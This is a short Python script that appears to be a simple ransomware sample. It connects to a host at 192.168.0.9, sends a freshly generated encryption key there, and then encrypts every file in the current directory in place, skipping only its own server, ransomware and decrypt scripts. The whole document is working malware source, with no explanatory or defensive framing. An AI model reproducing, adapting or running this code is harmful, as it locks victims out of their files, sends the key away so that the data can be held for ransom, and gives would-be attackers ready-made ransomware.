#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet 
import socket

s = socket.socket()
s.connect(('192.168.0.9', 8000))


files = []

for file in os.listdir():
    if file == 'server.py' or file == "ransomware.py" or file == 'decrypt.py':
        continue 
    if os.path.isfile(file):
        files.append(file)

key = Fernet.generate_key()

url = '192.168.0.9:4444'
obj = {'key': key}

s.send(str(key).encode())   
s.recv(1024).decode()
s.close() 

for file in files:
    with open(file, 'rb') as thefile:
        contents = thefile.read()

    contenst_encrypted = Fernet(key).encrypt(contents)
    with open(file, 'wb') as thefile:
        thefile.write(contenst_encrypted)

print(os.listdir())